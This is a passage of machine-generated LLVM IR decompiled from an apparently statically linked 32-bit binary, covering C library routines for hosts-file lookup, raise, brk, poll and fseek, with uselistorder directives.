  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80535dc.preheader ], [ %v4_80535d8, %dec_label_pc_80535d8 ], [ %stack_var_-196.013, %dec_label_pc_80535e1 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_80535ef = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8057a47.239 to i32), i32* %stack_var_-216, align 4
  %v5_80535fc = call i32 @__GI_strcoll(i8* %v4_80535fc, i32 ptrtoint ([11 x i8]* @global_var_8057a47.239 to i32), i32 %v0_80535ef, i32 %v0_80535ef)
  store i32 %v5_80535fc, i32* @eax, align 4
  %v1_8053604 = icmp eq i32 %v5_80535fc, 0
  br i1 %v1_8053604, label %dec_label_pc_805362c.preheader, label %dec_label_pc_805363d

dec_label_pc_805362c.preheader:                   ; preds = %dec_label_pc_80535e8
  %v0_805362c89 = load i32, i32* @esi, align 4
  %v5_805363098 = icmp slt i32 %v0_805362c89, %stack_var_-196.0.lcssa
  br i1 %v5_805363098, label %dec_label_pc_8053632.lr.ph, label %dec_label_pc_805363d

dec_label_pc_8053632.lr.ph:                       ; preds = %dec_label_pc_805362c.preheader
  %v0_8053632.pre = load i32, i32* @global_var_805eb74.174, align 4
  br label %dec_label_pc_8053632

dec_label_pc_805360a:                             ; preds = %dec_label_pc_8053632
  %v2_805360d = mul i32 %v0_805362c99, 4
  %v4_805360d = add i32 %v2_805360d, %v3_805360d
  %v5_805360d = inttoptr i32 %v4_805360d to i32*
  %v6_805360d = load i32, i32* %v5_805360d, align 4
  %v1_8053614 = add i32 %v0_805362c99, 1
  store i32 %v1_8053614, i32* @esi, align 4
  %v1_8053615 = inttoptr i32 %v6_805360d to i8*
  %v2_8053615 = call i32 @__GI_strdup(i8* %v1_8053615)
  %v1_805361d = load i32, i32* @ebx, align 4
  %v2_805361d = mul i32 %v1_805361d, 4
  %v3_805361d = add i32 %v2_805361d, 134605672
  %v4_805361d = inttoptr i32 %v3_805361d to i32*
  store i32 %v2_8053615, i32* %v4_805361d, align 4
  %v0_8053624 = load i32, i32* @ebx, align 4
  %v1_8053624 = add i32 %v0_8053624, 1
  store i32 %v1_8053624, i32* @eax, align 4
  store i32 %v1_8053624, i32* @global_var_805eb74.174, align 4
  %v0_805362c = load i32, i32* @esi, align 4
  %v5_8053630 = icmp slt i32 %v0_805362c, %stack_var_-196.0.lcssa
  br i1 %v5_8053630, label %dec_label_pc_8053632, label %dec_label_pc_805363d

dec_label_pc_8053632:                             ; preds = %dec_label_pc_8053632.lr.ph, %dec_label_pc_805360a
  %v0_8053632 = phi i32 [ %v0_8053632.pre, %dec_label_pc_8053632.lr.ph ], [ %v1_8053624, %dec_label_pc_805360a ]
  %v0_805362c99 = phi i32 [ %v0_805362c89, %dec_label_pc_8053632.lr.ph ], [ %v0_805362c, %dec_label_pc_805360a ]
  store i32 %v0_8053632, i32* @ebx, align 4
  %v7_805363b = icmp sgt i32 %v0_8053632, 2
  br i1 %v7_805363b, label %dec_label_pc_805363d, label %dec_label_pc_805360a

dec_label_pc_805363d:                             ; preds = %dec_label_pc_805362c.preheader, %dec_label_pc_805360a, %dec_label_pc_8053632, %dec_label_pc_80535e8
  %v0_805363d = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8057a52.240 to i32), i32* %stack_var_-216, align 4
  %v0_8053644 = load i32, i32* @edi, align 4
  %v4_8053645 = inttoptr i32 %v0_8053644 to i8*
  %v5_8053645 = call i32 @__GI_strcoll(i8* %v4_8053645, i32 ptrtoint ([7 x i8]* @global_var_8057a52.240 to i32), i32 %v0_805363d, i32 %v0_805363d)
  store i32 %v5_8053645, i32* @eax, align 4
  %v1_805364d = icmp eq i32 %v5_8053645, 0
  br i1 %v1_805364d, label %dec_label_pc_805368f.preheader, label %dec_label_pc_8053651

dec_label_pc_8053651:                             ; preds = %dec_label_pc_805363d
  %v0_8053651 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8057a59.241 to i32), i32* %stack_var_-216, align 4
  %v0_8053658 = load i32, i32* @edi, align 4
  %v4_8053659 = inttoptr i32 %v0_8053658 to i8*
  %v5_8053659 = call i32 @__GI_strcoll(i8* %v4_8053659, i32 ptrtoint ([7 x i8]* @global_var_8057a59.241 to i32), i32 %v0_8053651, i32 %v0_8053651)
  %v1_8053661 = icmp eq i32 %v5_8053659, 0
  br i1 %v1_8053661, label %dec_label_pc_805368f.preheader, label %dec_label_pc_80536d2

dec_label_pc_805368f.preheader:                   ; preds = %dec_label_pc_805363d, %dec_label_pc_8053651
  %v0_805368f100 = load i32, i32* @global_var_805eb78.234, align 8
  %tmp43103 = icmp slt i32 %v0_805368f100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8053667, label %dec_label_pc_8053698

dec_label_pc_8053667:                             ; preds = %dec_label_pc_805368f.preheader, %dec_label_pc_8053667.dec_label_pc_8053667_crit_edge
  %v0_805368f105 = phi i32 [ %v0_805368f, %dec_label_pc_8053667.dec_label_pc_8053667_crit_edge ], [ %v0_805368f100, %dec_label_pc_805368f.preheader ]
  %v1_8053667 = add i32 %v0_805368f105, -1
  %v1_805366b = mul i32 %v1_8053667, 4
  %v2_805366b = add i32 %v1_805366b, 134605656
  %v3_805366b = inttoptr i32 %v2_805366b to i32*
  %v4_805366b = load i32, i32* %v3_805366b, align 4
  store i32 %v1_8053667, i32* @global_var_805eb78.234, align 8
  %v1_8053677 = call i32 @free(i32 %v4_805366b)
  %v0_805367c = load i32, i32* @global_var_805eb78.234, align 8
  %v1_8053684 = mul i32 %v0_805367c, 4
  %v2_8053684 = add i32 %v1_8053684, ptrtoint (i32* @global_var_805eb58.242 to i32)
  %v3_8053684 = inttoptr i32 %v2_8053684 to i32*
  store i32 0, i32* %v3_8053684, align 4
  %v0_805368f = load i32, i32* @global_var_805eb78.234, align 8
  %tmp43 = icmp slt i32 %v0_805368f, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8053667.dec_label_pc_8053667_crit_edge, label %dec_label_pc_8053698

dec_label_pc_8053667.dec_label_pc_8053667_crit_edge: ; preds = %dec_label_pc_8053667
  br label %dec_label_pc_8053667

dec_label_pc_8053698:                             ; preds = %dec_label_pc_8053667, %dec_label_pc_805368f.preheader
  %v0_805368f.lcssa = phi i32 [ %v0_805368f100, %dec_label_pc_805368f.preheader ], [ %v0_805368f, %dec_label_pc_8053667 ]
  store i32 1, i32* @esi, align 4
  %v5_80536c5115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80536c5115, label %dec_label_pc_80536c7, label %dec_label_pc_80536d2

dec_label_pc_805369f:                             ; preds = %dec_label_pc_80536c7
  %v2_80536a2 = mul i32 %v0_80536a9117, 4
  %v4_80536a2 = add i32 %v2_80536a2, %v3_805360d
  %v5_80536a2 = inttoptr i32 %v4_80536a2 to i32*
  %v6_80536a2 = load i32, i32* %v5_80536a2, align 4
  %v1_80536a9 = add i32 %v0_80536a9117, 1
  store i32 %v1_80536a9, i32* @esi, align 4
  %v1_80536aa = inttoptr i32 %v6_80536a2 to i8*
  %v2_80536aa = call i32 @__GI_strdup(i8* %v1_80536aa)
  %v1_80536b2 = load i32, i32* @ebx, align 4
  %v2_80536b2 = mul i32 %v1_80536b2, 4
  %v3_80536b2 = add i32 %v2_80536b2, 134605656
  %v4_80536b2 = inttoptr i32 %v3_80536b2 to i32*
  store i32 %v2_80536aa, i32* %v4_80536b2, align 4
  %v0_80536b9 = load i32, i32* @ebx, align 4
  %v1_80536b9 = add i32 %v0_80536b9, 1
  store i32 %v1_80536b9, i32* @global_var_805eb78.234, align 8
  %v0_80536c1.pre = load i32, i32* @esi, align 4
  %v5_80536c5 = icmp slt i32 %v0_80536c1.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80536c5, label %dec_label_pc_80536c7, label %dec_label_pc_80536d2

dec_label_pc_80536c7:                             ; preds = %dec_label_pc_8053698, %dec_label_pc_805369f
  %v0_80536a9117 = phi i32 [ %v0_80536c1.pre, %dec_label_pc_805369f ], [ 1, %dec_label_pc_8053698 ]
  %v0_80536c7116 = phi i32 [ %v1_80536b9, %dec_label_pc_805369f ], [ %v0_805368f.lcssa, %dec_label_pc_8053698 ]
  store i32 %v0_80536c7116, i32* @ebx, align 4
  %v7_80536d0 = icmp sgt i32 %v0_80536c7116, 3
  br i1 %v7_80536d0, label %dec_label_pc_80536d2, label %dec_label_pc_805369f

dec_label_pc_80536d2:                             ; preds = %dec_label_pc_805355f.preheader, %dec_label_pc_805355e, %dec_label_pc_8053698, %dec_label_pc_80536c7, %dec_label_pc_805369f, %dec_label_pc_8053651, %dec_label_pc_8053580, %dec_label_pc_8053577, %dec_label_pc_80536d2.preheader
  %v0_80536d2 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80536d9, i32* @ebx, align 4
  %v3_80536de = call i32 @fgets(i32 %v2_80536d9, i32 128, i32 %v0_80536d2)
  store i32 %v3_80536de, i32* @eax, align 4
  %v1_80536e6 = icmp eq i32 %v3_80536de, 0
  %v1_80536e8 = icmp eq i1 %v1_80536e6, false
  br i1 %v1_80536e8, label %dec_label_pc_805355f.preheader, label %dec_label_pc_80536ee

dec_label_pc_805355f.preheader:                   ; preds = %dec_label_pc_80536d2
  %v0_805355f.pre = load i32, i32* @ebx, align 4
  %v4_805355f.pre = load i32, i32* @ecx, align 4
  %v1_805355f49 = inttoptr i32 %v0_805355f.pre to i8*
  %v2_805355f50 = load i8, i8* %v1_805355f49, align 1
  %v3_805355f51 = zext i8 %v2_805355f50 to i32
  %v5_805355f52 = and i32 %v4_805355f.pre, -256
  %v6_805355f53 = or i32 %v3_805355f51, %v5_805355f52
  store i32 %v6_805355f53, i32* @ecx, align 4
  %v4_805356154 = icmp eq i8 %v2_805355f50, 0
  br i1 %v4_805356154, label %dec_label_pc_80536d2, label %dec_label_pc_8053569.lr.ph

dec_label_pc_8053569.lr.ph:                       ; preds = %dec_label_pc_805355f.preheader
  %v0_8053569.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_8053569

dec_label_pc_80536ee:                             ; preds = %dec_label_pc_80536d2
  %v0_80536f1 = load i32, i32* @ebp, align 4
  %v1_80536f2 = inttoptr i32 %v0_80536f1 to i16*
  %v2_80536f2 = call i32 @__GI_fclose(i16* %v1_80536f2)
  br label %dec_label_pc_8053707

dec_label_pc_80536fc:                             ; preds = %dec_label_pc_805353b
  %v0_80536fc = call i32 @__GI___h_errno_location()
  %v1_8053701 = inttoptr i32 %v0_80536fc to i32*
  store i32 3, i32* %v1_8053701, align 4
  br label %dec_label_pc_8053707

dec_label_pc_8053707:                             ; preds = %entry, %dec_label_pc_80536ee, %dec_label_pc_80536fc
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_80534f4, i32* @eax, align 4
  %v2_8053713 = call i32 @__pthread_return_void(i32 %v2_80534f4, i32 1)
  store i32 %v0_80534e0, i32* @ebp, align 4
  ret i32 %v2_8053713

; uselistorder directives
  uselistorder i32 %v0_8053569.pre, { 1, 0 }
  uselistorder i32 %v6_805355f53, { 1, 0 }
  uselistorder i8 %v2_805355f50, { 1, 2, 0 }
  uselistorder i8* %v1_805355f49, { 1, 0 }
  uselistorder i32 %v0_805355f.pre, { 1, 0 }
  uselistorder i32 %v0_805368f, { 0, 2, 1 }
  uselistorder i32 %v0_8053632, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_80535ca, { 1, 0 }
  uselistorder i32 %v2_80535ab, { 1, 0 }
  uselistorder i32 %v1_805359f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805356e, { 1, 0 }
  uselistorder i32 %v1_805355e, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 18, 16, 15, 14, 13, 12, 11, 10, 26, 25, 24, 23, 2, 9, 8, 7, 6, 5, 0, 17, 19, 22, 21, 20, 4, 3, 1 }
  uselistorder i32* @global_var_805eb78.234, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_805eb74.174, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8058488.173 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8053707, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80536d2, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_80536c7, { 1, 0 }
  uselistorder label %dec_label_pc_8053667, { 1, 0 }
  uselistorder label %dec_label_pc_805368f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805363d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8053632, { 1, 0 }
  uselistorder label %dec_label_pc_80535e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80535e1, { 1, 0 }
  uselistorder label %dec_label_pc_80535d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80535c5, { 1, 0 }
  uselistorder label %dec_label_pc_80535a6, { 1, 0 }
  uselistorder label %dec_label_pc_80536d2.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8053747 = inttoptr i32 %arg3 to i32*
  %v10_8053747 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8053747, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8053747
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8053753 = call i32 @__libc_getpid()
  %v2_805375f = call i32 @kill(i32 %v0_8053753, i32 %arg1)
  ret i32 %v2_805375f

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8053768 = load i32, i32* @eax, align 4
  %v1_8053768 = add i32 %v0_8053768, 28
  %v2_8053768 = inttoptr i32 %v1_8053768 to i32*
  %v3_8053768 = load i32, i32* %v2_8053768, align 4
  store i32 %v3_8053768, i32* @global_var_805eb7c.243, align 4
  %v1_8053771 = add i32 %v0_8053768, 44
  %v2_8053771 = inttoptr i32 %v1_8053771 to i32*
  %v3_8053771 = load i32, i32* %v2_8053771, align 4
  store i32 %v3_8053771, i32* @global_var_805eb80.244, align 128
  ret i32 %v3_8053771
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805377c = load i32, i32* @ebx, align 4
  store i32 %v0_805377c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805378f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805378f, i32* @global_var_805e744.221, align 4
  %v7_805379a = icmp ult i32 %v1_805378f, %arg1
  %v1_805379c = icmp eq i1 %v7_805379a, false
  br i1 %v1_805379c, label %dec_label_pc_80537ac, label %dec_label_pc_805379e

dec_label_pc_805379e:                             ; preds = %entry
  %v0_805379e = load i32, i32* %stack_var_-4, align 4
  %v1_805379e = call i32 @__errno_location(i32 %v0_805379e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80537a6 = inttoptr i32 %v1_805379e to i32*
  store i32 12, i32* %v1_80537a6, align 4
  %v0_80537ad.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80537ac

dec_label_pc_80537ac:                             ; preds = %entry, %dec_label_pc_805379e
  %v0_80537ad = phi i32 [ 0, %entry ], [ %v0_80537ad.pre, %dec_label_pc_805379e ]
  %v2_80537b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80537b0, i32* @ebx, align 4
  ret i32 %v0_80537ad

; uselistorder directives
  uselistorder i32 %v1_805378f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_805e744.221, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80537ac, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80537b4 = load i32, i32* @edi, align 4
  store i32 %v0_80537b4, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80537c4 = load i32, i32* @ebx, align 4
  %v1_80537c5 = inttoptr i32 %tmp4 to %pollfd*
  %v5_80537cc = call i32 @poll(%pollfd* %v1_80537c5, i32 %tmp3, i32 %tmp)
  store i32 %v0_80537c4, i32* @ebx, align 4
  store i32 %v5_80537cc, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_80537cc, -4095
  br i1 %tmp10, label %dec_label_pc_80537e4, label %dec_label_pc_80537d8

dec_label_pc_80537d8:                             ; preds = %entry
  %v1_80537d8 = call i32 @__errno_location(i32 %v0_80537c4)
  %v0_80537dd = load i32, i32* %edi.global-to-local, align 4
  %v1_80537dd = sub i32 0, %v0_80537dd
  %v2_80537df = inttoptr i32 %v1_80537d8 to i32*
  store i32 %v1_80537dd, i32* %v2_80537df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80537e4

dec_label_pc_80537e4:                             ; preds = %entry, %dec_label_pc_80537d8
  %v0_80537e5 = phi i32 [ %v5_80537cc, %entry ], [ -1, %dec_label_pc_80537d8 ]
  %v2_80537e8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80537e8, i32* @edi, align 4
  ret i32 %v0_80537e5

; uselistorder directives
  uselistorder i32 %v5_80537cc, { 1, 0, 2 }
  uselistorder i32 %v0_80537c4, { 1, 0 }
  uselistorder label %dec_label_pc_80537e4, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80537f7 = ashr i32 %arg2, 31
  %v4_80537fe = inttoptr i32 %arg1 to i16*
  %v5_80537fe = call i32 @__GI_fseeko64(i16* %v4_80537fe, i32 %arg2, i32 %v1_80537f7, i32 %arg3)
  ret i32 %v5_80537fe
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053808 = load i32, i32* @ebp, align 4
  %v0_8053809 = load i32, i32* @edi, align 4
  %v0_805380a = load i32, i32* @esi, align 4
  %v0_805380b = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_805381b = ptrtoint i16* %arg1 to i32
  store i32 %v4_805381b, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_805383f, label %dec_label_pc_805382c

dec_label_pc_805382c:                             ; preds = %entry
  %v1_805382c = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_805382c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8053834 = inttoptr i32 %v1_805382c to i32*
  store i32 22, i32* %v1_8053834, align 4
  br label %dec_label_pc_80538e5

dec_label_pc_805383f:                             ; preds = %entry
  %v1_805383f = add i32 %v4_805381b, 52
  %v2_805383f = inttoptr i32 %v1_805383f to i32*
  %v3_805383f = load i32, i32* %v2_805383f, align 4
  %v1_8053842 = icmp eq i32 %v3_805383f, 0
  %v1_8053844 = icmp eq i1 %v1_8053842, false
  br i1 %v1_8053844, label %dec_label_pc_8053865, label %dec_label_pc_8053846

dec_label_pc_8053846:                             ; preds = %dec_label_pc_805383f
  %v1_8053846 = add i32 %v4_805381b, 56
  store i32 %v1_8053846, i32* @ebx, align 4
  %v2_8053850 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8053850, i32* @eax, align 4
  %v3_8053855 = call i32 @__pthread_return_void(i32 %v2_8053850, i32 134552147)
  store i32 %v3_8053855, i32* %eax.global-to-local, align 4
  %v0_805385a = load i32, i32* @ebx, align 4
  %v2_805385d = call i32 @__pthread_return_0(i32 %v0_805385a)
  store i32 %v2_805385d, i32* %eax.global-to-local, align 4
  %v0_8053865.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053865

dec_label_pc_8053865:                             ; preds = %dec_label_pc_805383f, %dec_label_pc_8053846
  %v0_805386d = phi i32 [ %v4_805381b, %dec_label_pc_805383f ], [ %v0_8053865.pre, %dec_label_pc_8053846 ]
  %v1_8053865 = inttoptr i32 %v0_805386d to i8*
  %v2_8053865 = load i8, i8* %v1_8053865, align 1
  %v3_8053865 = and i8 %v2_8053865, 64
  %v4_8053865 = icmp eq i8 %v3_8053865, 0
  br i1 %v4_8053865, label %dec_label_pc_805387a, label %dec_label_pc_805386a

dec_label_pc_805386a:                             ; preds = %dec_label_pc_8053865
  %v2_805386e = call i32 @__stdio_wcommit(i32 %v0_805386d)
  store i32 %v2_805386e, i32* %eax.global-to-local, align 4
  %v1_8053876 = icmp eq i32 %v2_805386e, 0
  %v1_8053878 = icmp eq i1 %v1_8053876, false
  br i1 %v1_8053878, label %dec_label_pc_80538cd, label %dec_label_pc_805387a

dec_label_pc_805387a:                             ; preds = %dec_label_pc_805386a, %dec_label_pc_8053865
  %v0_805387a = load i32, i32* @edi, align 4
  %v9_805387a = icmp eq i32 %v0_805387a, 1
  %v1_805387d = icmp eq i1 %v9_805387a, false
  br i1 %v1_805387d, label %dec_label_pc_805387a.dec_label_pc_8053893_crit_edge, label %dec_label_pc_805387f

dec_label_pc_805387a.dec_label_pc_8053893_crit_edge: ; preds = %dec_label_pc_805387a
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053893

dec_label_pc_805387f:                             ; preds = %dec_label_pc_805387a
  %v0_805387f = load i32, i32* @ecx, align 4
  %v2_8053881 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8053881, i32* %eax.global-to-local, align 4
  %v0_8053886 = load i32, i32* @esi, align 4
  %v5_8053886 = inttoptr i32 %v0_8053886 to i16*
  %v6_8053887 = call i32 @__stdio_adjust_position(i16* %v5_8053886, i32 %v2_8053881, i32 %v0_805387f, i32 %v0_805387f)
  store i32 %v6_8053887, i32* %eax.global-to-local, align 4
  %v2_805388f = icmp slt i32 %v6_8053887, 0
  br i1 %v2_805388f, label %dec_label_pc_80538cd, label %dec_label_pc_805387f.dec_label_pc_8053893_crit_edge

dec_label_pc_805387f.dec_label_pc_8053893_crit_edge: ; preds = %dec_label_pc_805387f
  %v0_8053894.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053893

dec_label_pc_8053893:                             ; preds = %dec_label_pc_805387a.dec_label_pc_8053893_crit_edge, %dec_label_pc_805387f.dec_label_pc_8053893_crit_edge
  %v2_8053895.pre-phi = phi i32 [ %.pre6, %dec_label_pc_805387a.dec_label_pc_8053893_crit_edge ], [ %v2_8053881, %dec_label_pc_805387f.dec_label_pc_8053893_crit_edge ]
  %v0_8053894 = phi i32 [ %v0_805387a, %dec_label_pc_805387a.dec_label_pc_8053893_crit_edge ], [ %v0_8053894.pre, %dec_label_pc_805387f.dec_label_pc_8053893_crit_edge ]
  %v0_8053893 = load i32, i32* @edx, align 4
  store i32 %v2_8053895.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805389a = load i32, i32* @esi, align 4
  %v5_805389b = inttoptr i32 %v2_8053895.pre-phi to i32*
  %v6_805389b = call i32 @__stdio_seek(i32 %v0_805389a, i32* %v5_805389b, i32 %v0_8053894, i32 %v0_8053893)
  store i32 %v6_805389b, i32* %eax.global-to-local, align 4
  %v2_80538a3 = icmp slt i32 %v6_805389b, 0
  br i1 %v2_80538a3, label %dec_label_pc_80538cd, label %dec_label_pc_80538a7

dec_label_pc_80538a7:                             ; preds = %dec_label_pc_8053893
  %v0_80538a7 = load i32, i32* @esi, align 4
  %v1_80538a7 = inttoptr i32 %v0_80538a7 to i32*
  %v2_80538a7 = load i32, i32* %v1_80538a7, align 4
  store i32 %v2_80538a7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80538ab = add i32 %v0_80538a7, 44
  %v2_80538ab = inttoptr i32 %v1_80538ab to i32*
  store i32 0, i32* %v2_80538ab, align 4
  %v0_80538b2 = load i32, i32* @esi, align 4
  %v1_80538b2 = add i32 %v0_80538b2, 2
  %v2_80538b2 = inttoptr i32 %v1_80538b2 to i8*
  store i8 0, i8* %v2_80538b2, align 1
  %v0_80538b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538b6 = and i32 %v0_80538b6, -72
  store i32 %v1_80538b6, i32* %eax.global-to-local, align 4
  %v1_80538b9 = trunc i32 %v1_80538b6 to i16
  %v2_80538b9 = load i32, i32* @esi, align 4
  %v3_80538b9 = inttoptr i32 %v2_80538b9 to i16*
  store i16 %v1_80538b9, i16* %v3_80538b9, align 2
  %v0_80538bc = load i32, i32* @esi, align 4
  %v1_80538bc = add i32 %v0_80538bc, 8
  %v2_80538bc = inttoptr i32 %v1_80538bc to i32*
  %v3_80538bc = load i32, i32* %v2_80538bc, align 4
  store i32 %v3_80538bc, i32* %eax.global-to-local, align 4
  %v2_80538bf = add i32 %v0_80538bc, 16
  %v3_80538bf = inttoptr i32 %v2_80538bf to i32*
  store i32 %v3_80538bc, i32* %v3_80538bf, align 4
  %v0_80538c2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538c2 = load i32, i32* @esi, align 4
  %v2_80538c2 = add i32 %v1_80538c2, 20
  %v3_80538c2 = inttoptr i32 %v2_80538c2 to i32*
  store i32 %v0_80538c2, i32* %v3_80538c2, align 4
  %v0_80538c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538c5 = load i32, i32* @esi, align 4
  %v2_80538c5 = add i32 %v1_80538c5, 24
  %v3_80538c5 = inttoptr i32 %v2_80538c5 to i32*
  store i32 %v0_80538c5, i32* %v3_80538c5, align 4
  %v0_80538c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538c8 = load i32, i32* @esi, align 4
  %v2_80538c8 = add i32 %v1_80538c8, 28
  %v3_80538c8 = inttoptr i32 %v2_80538c8 to i32*
  store i32 %v0_80538c8, i32* %v3_80538c8, align 4
  br label %dec_label_pc_80538d0

dec_label_pc_80538cd:                             ; preds = %dec_label_pc_8053893, %dec_label_pc_805387f, %dec_label_pc_805386a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80538d0

dec_label_pc_80538d0:                             ; preds = %dec_label_pc_80538a7, %dec_label_pc_80538cd
  br i1 %v1_8053844, label %dec_label_pc_80538e5, label %dec_label_pc_80538d4

dec_label_pc_80538d4:                             ; preds = %dec_label_pc_80538d0
  %v2_80538d8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80538d8, i32* @eax, align 4
  %v3_80538dd = call i32 @__pthread_return_void(i32 %v2_80538d8, i32 1)
  store i32 %v3_80538dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538e5

dec_label_pc_80538e5:                             ; preds = %dec_label_pc_80538d0, %dec_label_pc_805382c, %dec_label_pc_80538d4
  %v0_80538e8 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80538e8, i32* %eax.global-to-local, align 4
  store i32 %v0_805380b, i32* @ebx, align 4
  store i32 %v0_805380a, i32* @esi, align 4
  store i32 %v0_8053809, i32* @edi, align 4
  store i32 %v0_8053808, i32* @ebp, align 4
  ret i32 %v0_80538e8

; uselistorder directives
  uselistorder i32 %v2_8053895.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805387a, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 1, 4, 5, 6, 2, 3, 0 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 23, 22, 21, 20, 19, 18, 17, 3, 27, 33, 32, 15, 2, 1, 0, 11, 31, 10, 16, 7, 6, 5, 9, 8, 30, 14, 29, 4, 13, 12, 26, 25, 24 }
